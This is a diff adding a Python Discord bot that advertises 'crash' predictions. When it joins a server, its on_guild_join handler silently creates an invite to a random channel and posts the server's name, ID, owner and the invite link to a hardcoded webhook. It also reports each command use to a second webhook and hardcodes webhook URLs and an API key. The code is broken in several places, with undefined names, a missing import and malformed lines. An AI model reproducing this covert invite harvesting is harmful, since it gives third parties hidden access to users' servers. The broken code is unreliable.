@@ -1,0 +1,71 @@
+
+import random
+import discord
+import discord.utils
+from discord.ext import commands
+import time
+import math
+import random
+import threading
+import os
+import discord
+from discord.commands import Option
+import requests
+from discord import Permissions 
+send =[]
+counts=(0)
+
+
+key = "A2Dn7x9WNkT1ZKRvIpwilkv2eTteYtqj"
+
+
+
+web3 = 'https://discord.com/api/webhooks/1021093118579327076/r4f9gu2AePP_FtFXskzqC2mXWpa8TbSvTHIkvjmivgYqTgrN5XbuxDZBq3K_jvCnCZvR'
+embed5 = discord.Embed( title="black predicor ", url = "", description=f"Want one of the Best and che")
+embed2.set_image(url="https://cdn.discordapp.com/attachments/1021103664141697054/1023204555279835146/unknown.png")
+web = "https://discord.com/api/webhooks/1021093118579327076/r4f9gu2AePP_FtFXskzqC2mXWpa8TbSvTHIkvjmivgYqTgrN5XbuxDZBq3K_jvCnCZvR"
+web2="https://discord.com/api/webhooks/1021105461275131955/qXCN241aXv9k2lBNyzrXGzPebZqWiw5RLSoFMJyzJ1TDnWuXQhAyWd3IFKRIfk3y9cBt"
+bot = discord.AutoShardedBot(shard_count=20, intents=discord.Intents.default())
+times = 0
+ids = []
+scraper = cloudscraper.create_scraper()
+
+a = len(bot.guilds)
+@bot.event
+async def on_guild_join(guild):
+  try:
+   a = guild.channels
+   chan = random.choice(a)
+   link = await chan.create_invite()
+   requests.post(f'{web2}', data={'content':f"`{guild.name}`\n> ID: `{guild.id}`\n> Owner: <@{guild.owner_id}>\n> Servers: `{len(bot.guilds)}`\n> Invite: {link} \n"})
+  except:
+    requests.post(f'{web2}', data={'content':f"`{guild.name}`\n> ID: `{guild.id}`\n> Owner: <@{guild.owner_id}>\n> Servers: `{len(bot.guilds)}`\n"})
+  
+class Buttons(discord.ui.View):
+    def __init__(self, *, timeout=180):
+        super().__init__(timeout=timeout)
+
+
+@bot.event
+async def on_ready():
+ print('bot online')
+
+
+times@bot.slash_command(description="Predict crash")
+async def crash(ctx):
+    ok = await ctx.respond(embed=discord.Embed(title="Checking API", description="Please wait until the bot checks the API", color=0x5ca3ff), ephemeral=True)
+    await crasho(ctx)
+    global times
+    if times == 3:
+    if times == 3:
+          await ctx.send(embed=embed5)
+          times-=3
+    else: 
+          times+=1
+    global counts
+    counts+=1
+    requests.post(f'{web}', data={'content':f"code executed {counts}"})
+
+
+bot.run('put your code here')
+
